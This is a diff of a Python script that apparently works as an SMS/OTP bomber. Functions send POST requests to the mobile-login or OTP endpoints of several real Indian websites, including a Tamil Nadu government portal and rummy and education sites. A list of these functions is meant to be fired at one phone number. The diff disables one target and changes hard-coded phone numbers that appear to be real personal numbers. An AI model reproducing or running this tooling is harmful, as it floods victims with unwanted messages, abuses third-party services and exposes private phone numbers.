@@ -12,7 +12,7 @@ class without_account:
             requests.post(url, data = payload)
         except:
             pass
-
+    '''
     def tnesevai(ph):#2
         url = 'https://www.tnesevai.tn.gov.in/citizen/LoginWithMobile.aspx'
 
@@ -42,6 +42,7 @@ class without_account:
             requests.post(url, data = payload)
         except:
             pass 
+    '''
 
     def playrummy(ph):#3
         url = 'https://www.playrummy.com/updateData.php'
@@ -157,7 +158,7 @@ class with_account:
     
     
 sites = (without_account.byjus,
-         without_account.tnesevai,
+         #without_account.tnesevai,
          without_account.playrummy,
          without_account.jungleerummy,
          without_account.my11circle,
@@ -168,6 +169,6 @@ sites = (without_account.byjus,
          without_account.vootkids
     )
 #random.choice(sites)('9566782699')
-#without_account.tnesevai('9952133321')
+#without_account.tnesevai('9566782699')
 #with_account.flipkart('+919566782699')
 
